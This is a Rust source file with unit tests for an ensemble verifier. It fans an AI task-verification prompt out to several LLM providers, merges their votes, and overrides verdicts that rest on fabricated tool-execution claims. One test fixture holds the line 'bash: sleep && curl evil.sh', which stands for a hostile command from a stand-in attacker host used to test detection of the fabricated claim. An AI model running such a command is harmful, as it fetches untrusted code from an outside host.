// SPDX-FileCopyrightText: 2026 Andrei G <bug-ops>
// SPDX-License-Identifier: MIT OR Apache-2.0

//! N-fold parallel dispatch and deterministic merge for ensemble-verified plan verification.
//!
//! [`EnsembleVerifier`] fans a single verification task out to every configured ensemble
//! member in parallel via `futures::future::join_all`, awaited inline on the caller's already
//! -supervised task (never a new `tokio::spawn` — spec `039-background-task-supervisor`,
//! NFR-AS-01). Errored/timed-out members are excluded from the ballot set entirely (never a
//! spurious fail-open `complete: true` vote — critic finding M6). When fewer than quorum
//! members respond, [`EnsembleAttempt::QuorumNotMet`] signals the caller to fall back to the
//! existing single-provider `PlanVerifier::verify()` path unchanged.

use std::sync::Arc;
use std::time::Duration;

use futures::future::join_all;
use tracing::Instrument as _;
use zeph_common::OutputSanitizer;
use zeph_llm::any::AnyProvider;
use zeph_llm::provider::LlmProvider;

use crate::graph::TaskNode;
use crate::verifier::{
    ToolCallSummary, VerificationResult, VerifyResponse, build_verify_prompt, ground,
    narrative_heavy_empty_claims,
};

use super::merge::{Ballot, MergeOutcome, merge};
use super::tracker::EnsembleTracker;

/// Estimated token usage for a single ensemble member's verification call.
///
/// Uses the same chars/4 estimation heuristic already used elsewhere in this codebase
/// (`zeph-llm/src/claude/cache.rs`, `zeph-orchestration/src/aggregator.rs`) rather than a
/// precise tokenizer — `PlanVerifier::verify()` does not record usage today, so this is
/// net-new, best-effort instrumentation (FR-016), not a copy of an exact existing mechanism.
#[derive(Debug, Clone)]
pub struct MemberUsage {
    /// Name of the `[[llm.providers]]` entry this usage is attributed to.
    pub member: String,
    /// Estimated input (prompt) tokens.
    pub input_tokens: u64,
    /// Estimated output (completion) tokens.
    pub output_tokens: u64,
}

/// Outcome of a single [`EnsembleVerifier::verify`] attempt.
pub enum EnsembleAttempt {
    /// Quorum was met and ballots were merged.
    Merged {
        /// The `VerificationResult` for the caller's `should_replan` gate. Contains only
        /// `complete`/`gaps`/`confidence` — `agreement_ratio` and `tie_broken` never leave
        /// `MergeOutcome`.
        result: VerificationResult,
        /// Full merge outcome, including telemetry-only fields, for observability.
        outcome: MergeOutcome,
    },
    /// Fewer than `quorum` members responded. The caller must fall back to the existing
    /// single-provider `PlanVerifier::verify()` path (including its own fail-open behavior)
    /// and increment the `ensemble_degraded` counter.
    QuorumNotMet {
        /// Number of members that responded successfully (before the quorum check).
        responded: usize,
        /// Minimum responders required (`members.len() / 2 + 1`).
        quorum: usize,
        /// Total configured members for this ensemble.
        configured: usize,
    },
}

/// N-fold parallel verifier: dispatches the same task to every configured ensemble member
/// and merges their independent ballots deterministically.
pub struct EnsembleVerifier {
    /// (provider name, resolved provider) pairs, in configured order. A name-provider pair
    /// (not a bare `Vec<AnyProvider>`) so a partial bootstrap-time resolution failure cannot
    /// desynchronize `Ballot.member`/`EnsembleTracker.record` from the wrong config entry.
    members: Vec<(String, AnyProvider)>,
    member_timeout: Duration,
    tracker: EnsembleTracker,
    /// Per-member usage estimates from the most recent `verify()` call. Read by the caller
    /// (which owns the `CostTracker`) after each call; cleared and repopulated on the next.
    last_usage: Vec<MemberUsage>,
    /// Total times post-merge grounding overrode a merged `complete: true` verdict to `false`
    /// (spec 009 § Verifier Tool-Call Grounding, Observability).
    grounding_overrides_total: u64,
    /// Soft telemetry: merged-round output was execution-narrative-heavy yet the union of
    /// `claimed_executions` across all responded members came back empty. Trend signal only.
    grounding_narrative_empty_claims_total: u64,
}

impl EnsembleVerifier {
    /// Create a new `EnsembleVerifier` from resolved members, a per-member call timeout, and
    /// a tracker (fresh or carried over from a prior verifier instance).
    #[must_use]
    pub fn new(
        members: Vec<(String, AnyProvider)>,
        member_timeout: Duration,
        tracker: EnsembleTracker,
    ) -> Self {
        Self {
            members,
            member_timeout,
            tracker,
            last_usage: Vec::new(),
            grounding_overrides_total: 0,
            grounding_narrative_empty_claims_total: 0,
        }
    }

    /// Total times post-merge grounding overrode a merged `complete: true` verdict to `false`
    /// since this `EnsembleVerifier` was created.
    #[must_use]
    pub fn grounding_overrides_total(&self) -> u64 {
        self.grounding_overrides_total
    }

    /// Soft telemetry counter pairing with [`Self::grounding_overrides_total`] — see that
    /// method's doc and `PlanVerifier::grounding_narrative_empty_claims_total`.
    #[must_use]
    pub fn grounding_narrative_empty_claims_total(&self) -> u64 {
        self.grounding_narrative_empty_claims_total
    }

    /// Number of configured members.
    #[must_use]
    pub fn member_count(&self) -> usize {
        self.members.len()
    }

    /// Minimum number of responders required for quorum (`members.len() / 2 + 1`).
    #[must_use]
    pub fn quorum(&self) -> usize {
        self.members.len() / 2 + 1
    }

    /// Read-only access to the agreement tracker, for CLI/TUI stats surfacing.
    #[must_use]
    pub fn tracker(&self) -> &EnsembleTracker {
        &self.tracker
    }

    /// Per-member usage estimates from the most recent `verify()` call.
    #[must_use]
    pub fn last_usage(&self) -> &[MemberUsage] {
        &self.last_usage
    }

    /// Fan a single verification task out to every configured member in parallel and merge
    /// the responses.
    ///
    /// Each member call is independently wrapped in `tokio::time::timeout(member_timeout,
    /// ...)` (NFR-AS-03). Errored/timed-out members are excluded from the ballot set — never
    /// cast as a fail-open vote (M6): `PlanVerifier::fail_open()` is reserved for the
    /// ensemble-level below-quorum fallback the caller performs on
    /// [`EnsembleAttempt::QuorumNotMet`], not for an individual member.
    #[tracing::instrument(
        name = "orchestration.ensemble.verify",
        skip(self, output, tool_trace, sanitizer),
        fields(task.id = %task.id, members = self.members.len())
    )]
    pub async fn verify(
        &mut self,
        task: &TaskNode,
        output: &str,
        tool_trace: Option<&[ToolCallSummary]>,
        sanitizer: &Arc<dyn OutputSanitizer>,
    ) -> EnsembleAttempt {
        let configured = self.members.len();
        let quorum = self.quorum();
        let member_timeout = self.member_timeout;
        let messages = build_verify_prompt(task, output, tool_trace, sanitizer);
        #[allow(clippy::cast_possible_truncation)]
        let input_chars: usize = messages.iter().map(|m| m.content.chars().count()).sum();

        let calls = self.members.iter().map(|(name, provider)| {
            let member_name = name.clone();
            let provider = provider.clone();
            let messages = messages.clone();
            let span = tracing::info_span!(
                "orchestration.ensemble.verify_member",
                member = %member_name
            );
            async move {
                let call = provider.chat_typed::<VerifyResponse>(&messages);
                let outcome = tokio::time::timeout(member_timeout, call).await;
                (member_name, outcome)
            }
            .instrument(span)
        });

        let responses = join_all(calls).await;

        let mut ballots = Vec::with_capacity(responses.len());
        let mut usage = Vec::with_capacity(responses.len());
        // Union of claimed_executions across all responded members (S2): captured here,
        // before merge() discards it, since merge() itself stays pure/unchanged and only ever
        // sees {complete, confidence, gaps} via Ballot.
        let mut claimed_union: std::collections::BTreeSet<String> =
            std::collections::BTreeSet::new();
        for (member, outcome) in responses {
            match outcome {
                Ok(Ok(vr)) => {
                    // 4 chars-per-token estimate (consistent with the codebase's existing
                    // heuristic elsewhere — no exact tokenizer is available for chat_typed's
                    // already-deserialized response).
                    let output_chars = serde_json::to_string(&vr).map_or(0, |s| s.chars().count());
                    usage.push(MemberUsage {
                        member: member.clone(),
                        input_tokens: (input_chars / 4) as u64,
                        output_tokens: (output_chars / 4) as u64,
                    });
                    claimed_union.extend(vr.claimed_executions.iter().cloned());
                    ballots.push(Ballot {
                        member,
                        complete: vr.complete,
                        confidence: vr.confidence,
                        gaps: vr.gaps,
                    });
                }
                Ok(Err(e)) => {
                    tracing::warn!(
                        member = %member,
                        error = %e,
                        task_id = %task.id,
                        "ensemble member LLM call failed — excluded from ballot (M6)"
                    );
                }
                Err(_elapsed) => {
                    tracing::warn!(
                        member = %member,
                        timeout_secs = member_timeout.as_secs(),
                        task_id = %task.id,
                        "ensemble member timed out — excluded from ballot (M6)"
                    );
                }
            }
        }
        self.last_usage = usage;

        if ballots.len() < quorum {
            return EnsembleAttempt::QuorumNotMet {
                responded: ballots.len(),
                quorum,
                configured,
            };
        }

        let outcome = merge(&ballots);
        for ballot in &ballots {
            self.tracker
                .record(&ballot.member, ballot.complete == outcome.complete);
        }

        // Grounding runs as a stage AFTER merge() (S2) — merge() itself stays pure/unchanged.
        let claims: Vec<String> = claimed_union.into_iter().collect();
        let grounded = self.ground_merged_outcome(task, output, &outcome, &claims, tool_trace);

        let result = VerificationResult {
            complete: grounded.complete,
            gaps: grounded.gaps,
            confidence: outcome.merged_confidence,
        };

        EnsembleAttempt::Merged { result, outcome }
    }

    /// Run the deterministic `ground()` stage over the post-`merge()` outcome and the union of
    /// claimed executions, updating observability counters/logs along the way (spec 009 §
    /// Verifier Tool-Call Grounding, Observability). `merge()` itself is untouched — this is a
    /// separate stage that runs after it (S2).
    fn ground_merged_outcome(
        &mut self,
        task: &TaskNode,
        output: &str,
        outcome: &MergeOutcome,
        claims: &[String],
        tool_trace: Option<&[ToolCallSummary]>,
    ) -> crate::verifier::GroundingOutcome {
        if narrative_heavy_empty_claims(output, claims) {
            self.grounding_narrative_empty_claims_total = self
                .grounding_narrative_empty_claims_total
                .saturating_add(1);
        }

        let grounded = ground(outcome.complete, outcome.gaps.clone(), claims, tool_trace);

        if outcome.complete && !grounded.complete {
            self.grounding_overrides_total = self.grounding_overrides_total.saturating_add(1);
            tracing::warn!(
                task_id = %task.id,
                unmatched_claims = ?grounded.unmatched_claims,
                matched = claims.len() - grounded.unmatched_claims.len(),
                total_claims = claims.len(),
                "ensemble grounding override: merged verdict complete=true overridden to \
                 false — unmatched claimed tool execution(s) not found in the real tool trace"
            );
        }

        grounded
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::graph::TaskId;
    use zeph_common::IdentitySanitizer;
    use zeph_llm::LlmError;
    use zeph_llm::mock::MockProvider;

    fn test_sanitizer() -> Arc<dyn OutputSanitizer> {
        Arc::new(IdentitySanitizer)
    }

    fn test_task() -> TaskNode {
        let mut n = TaskNode::new(0, "write code", "write the implementation");
        n.id = TaskId(0);
        n
    }

    fn ok_provider(response: String) -> AnyProvider {
        AnyProvider::Mock(MockProvider::with_responses(vec![response]))
    }

    fn err_provider() -> AnyProvider {
        AnyProvider::Mock(MockProvider::default().with_errors(vec![LlmError::Unavailable]))
    }

    fn slow_provider(response: String, delay_ms: u64) -> AnyProvider {
        AnyProvider::Mock(MockProvider::with_responses(vec![response]).with_delay(delay_ms))
    }

    fn complete_json(confidence: f64) -> String {
        format!(r#"{{"complete": true, "gaps": [], "confidence": {confidence}}}"#)
    }

    fn incomplete_json(confidence: f64) -> String {
        format!(
            r#"{{"complete": false, "gaps": [{{"description": "gap", "severity": "critical"}}], "confidence": {confidence}}}"#
        )
    }

    #[tokio::test]
    async fn full_quorum_all_agree_merges_correctly() {
        let members = vec![
            ("a".to_string(), ok_provider(complete_json(0.9))),
            ("b".to_string(), ok_provider(complete_json(0.8))),
            ("c".to_string(), ok_provider(complete_json(0.95))),
        ];
        let mut verifier = EnsembleVerifier::new(
            members,
            Duration::from_secs(5),
            EnsembleTracker::new(0.3, 0.95, 5),
        );
        let task = test_task();
        match verifier
            .verify(&task, "output", None, &test_sanitizer())
            .await
        {
            EnsembleAttempt::Merged { result, outcome } => {
                assert!(result.complete);
                assert!((result.confidence - 0.883_333_333_333_333_3).abs() < 1e-6);
                assert!((outcome.agreement_ratio - 1.0).abs() < 1e-9);
            }
            EnsembleAttempt::QuorumNotMet { .. } => panic!("expected quorum to be met"),
        }
        assert_eq!(verifier.last_usage().len(), 3);
    }

    #[tokio::test]
    async fn quorum_not_met_when_two_of_three_error() {
        let members = vec![
            ("a".to_string(), ok_provider(complete_json(0.9))),
            ("b".to_string(), err_provider()),
            ("c".to_string(), err_provider()),
        ];
        let mut verifier = EnsembleVerifier::new(
            members,
            Duration::from_secs(5),
            EnsembleTracker::new(0.3, 0.95, 5),
        );
        let task = test_task();
        match verifier
            .verify(&task, "output", None, &test_sanitizer())
            .await
        {
            EnsembleAttempt::QuorumNotMet {
                responded,
                quorum,
                configured,
            } => {
                assert_eq!(responded, 1);
                assert_eq!(quorum, 2);
                assert_eq!(configured, 3);
            }
            EnsembleAttempt::Merged { .. } => panic!("expected quorum not met"),
        }
    }

    /// M6 acceptance test: N=3, 1 member errors, merge proceeds over the 2 responders and the
    /// confidence mean excludes the errored member (not zero-padded).
    #[tokio::test]
    async fn m6_one_of_three_errors_merge_proceeds_over_responders() {
        let members = vec![
            ("a".to_string(), ok_provider(complete_json(0.9))),
            ("b".to_string(), ok_provider(complete_json(0.8))),
            ("c".to_string(), err_provider()),
        ];
        let mut verifier = EnsembleVerifier::new(
            members,
            Duration::from_secs(5),
            EnsembleTracker::new(0.3, 0.95, 5),
        );
        let task = test_task();
        match verifier
            .verify(&task, "output", None, &test_sanitizer())
            .await
        {
            EnsembleAttempt::Merged { result, .. } => {
                assert!(result.complete);
                // Mean of {0.9, 0.8} = 0.85, not mean of {0.9, 0.8, 0.0}.
                assert!((result.confidence - 0.85).abs() < 1e-9);
            }
            EnsembleAttempt::QuorumNotMet { .. } => panic!("2 of 3 responders meets quorum=2"),
        }
        assert_eq!(
            verifier.last_usage().len(),
            2,
            "errored member has no usage record"
        );
    }

    #[tokio::test]
    async fn member_timeout_excludes_from_ballot() {
        let members = vec![
            ("fast".to_string(), ok_provider(complete_json(0.9))),
            (
                "slow".to_string(),
                slow_provider(complete_json(0.9), 60_000),
            ),
            ("fast2".to_string(), ok_provider(complete_json(0.8))),
        ];
        let mut verifier = EnsembleVerifier::new(
            members,
            Duration::from_millis(50),
            EnsembleTracker::new(0.3, 0.95, 5),
        );
        let task = test_task();
        match verifier
            .verify(&task, "output", None, &test_sanitizer())
            .await
        {
            EnsembleAttempt::Merged { result, .. } => {
                assert!(result.complete);
                assert!((result.confidence - 0.85).abs() < 1e-9);
            }
            EnsembleAttempt::QuorumNotMet { .. } => panic!("2 of 3 responders meets quorum=2"),
        }
    }

    #[tokio::test]
    async fn split_verdict_incomplete_wins_triggers_replan_shape() {
        let members = vec![
            ("a".to_string(), ok_provider(incomplete_json(0.4))),
            ("b".to_string(), ok_provider(incomplete_json(0.6))),
            ("c".to_string(), ok_provider(complete_json(0.95))),
        ];
        let mut verifier = EnsembleVerifier::new(
            members,
            Duration::from_secs(5),
            EnsembleTracker::new(0.3, 0.95, 5),
        );
        let task = test_task();
        match verifier
            .verify(&task, "output", None, &test_sanitizer())
            .await
        {
            EnsembleAttempt::Merged { result, outcome } => {
                assert!(!result.complete);
                assert_eq!(result.gaps.len(), 2);
                assert!((result.confidence - 0.5).abs() < 1e-9);
                assert!((outcome.agreement_ratio - 2.0 / 3.0).abs() < 1e-9);
            }
            EnsembleAttempt::QuorumNotMet { .. } => panic!("expected quorum to be met"),
        }
    }

    #[tokio::test]
    async fn tracker_records_agreement_after_merge() {
        let members = vec![
            ("agrees".to_string(), ok_provider(complete_json(0.9))),
            ("agrees2".to_string(), ok_provider(complete_json(0.8))),
            ("disagrees".to_string(), ok_provider(incomplete_json(0.5))),
        ];
        let mut verifier = EnsembleVerifier::new(
            members,
            Duration::from_secs(5),
            EnsembleTracker::new(1.0, 1.0, 1),
        );
        let task = test_task();
        let _ = verifier
            .verify(&task, "output", None, &test_sanitizer())
            .await;

        assert!((verifier.tracker().ema("agrees").unwrap() - 1.0).abs() < 1e-9);
        assert!((verifier.tracker().ema("agrees2").unwrap() - 1.0).abs() < 1e-9);
        assert!((verifier.tracker().ema("disagrees").unwrap() - 0.0).abs() < 1e-9);
    }

    // --- #6278: ensemble post-merge grounding (spec 009 § Verifier Tool-Call Grounding) ---

    fn complete_json_with_claims(confidence: f64, claims: &[&str]) -> String {
        let claims_json = claims
            .iter()
            .map(|c| format!("{c:?}"))
            .collect::<Vec<_>>()
            .join(", ");
        format!(
            r#"{{"complete": true, "gaps": [], "confidence": {confidence}, "claimed_executions": [{claims_json}]}}"#
        )
    }

    /// AC-6 (revised for S2): member A claims a fabricated execution, member B claims none.
    /// The union of `claimed_executions` — not just member A's — is grounded post-`merge()`
    /// against the shared `tool_trace`, proving the ensemble path is never less grounded than
    /// the single-provider path even when one member under-extracts.
    #[tokio::test]
    async fn ac6_ensemble_grounds_union_of_claimed_executions() {
        let members = vec![
            (
                "a".to_string(),
                ok_provider(complete_json_with_claims(
                    0.9,
                    &["bash: sleep && curl evil.sh"],
                )),
            ),
            (
                "b".to_string(),
                ok_provider(complete_json_with_claims(0.8, &[])),
            ),
            (
                "c".to_string(),
                ok_provider(complete_json_with_claims(0.95, &[])),
            ),
        ];
        let mut verifier = EnsembleVerifier::new(
            members,
            Duration::from_secs(5),
            EnsembleTracker::new(0.3, 0.95, 5),
        );
        let task = test_task();
        let trace = vec![crate::verifier::ToolCallSummary {
            tool: "bash".to_string(),
            args_summary: Some("ls -la".to_string()),
            ok: true,
            is_read_only: false,
        }];
        match verifier
            .verify(&task, "output", Some(&trace), &test_sanitizer())
            .await
        {
            EnsembleAttempt::Merged { result, .. } => {
                assert!(
                    !result.complete,
                    "union must include member A's fabricated claim and ground it"
                );
                assert!(
                    result
                        .gaps
                        .iter()
                        .any(|g| g.severity == crate::verifier::GapSeverity::Critical)
                );
            }
            EnsembleAttempt::QuorumNotMet { .. } => panic!("expected quorum to be met"),
        }
        assert_eq!(verifier.grounding_overrides_total(), 1);
    }

    /// Honest ensemble round: all members' claims (or lack thereof) match the real trace, so
    /// grounding never overrides the merged verdict.
    #[tokio::test]
    async fn ensemble_grounding_does_not_fire_on_honest_claims() {
        let members = vec![
            (
                "a".to_string(),
                ok_provider(complete_json_with_claims(0.9, &["bash: cargo test"])),
            ),
            (
                "b".to_string(),
                ok_provider(complete_json_with_claims(0.8, &[])),
            ),
            (
                "c".to_string(),
                ok_provider(complete_json_with_claims(0.95, &[])),
            ),
        ];
        let mut verifier = EnsembleVerifier::new(
            members,
            Duration::from_secs(5),
            EnsembleTracker::new(0.3, 0.95, 5),
        );
        let task = test_task();
        let trace = vec![crate::verifier::ToolCallSummary {
            tool: "bash".to_string(),
            args_summary: Some("cargo test --all-features".to_string()),
            ok: true,
            is_read_only: false,
        }];
        match verifier
            .verify(&task, "output", Some(&trace), &test_sanitizer())
            .await
        {
            EnsembleAttempt::Merged { result, .. } => {
                assert!(result.complete);
            }
            EnsembleAttempt::QuorumNotMet { .. } => panic!("expected quorum to be met"),
        }
        assert_eq!(verifier.grounding_overrides_total(), 0);
    }
}
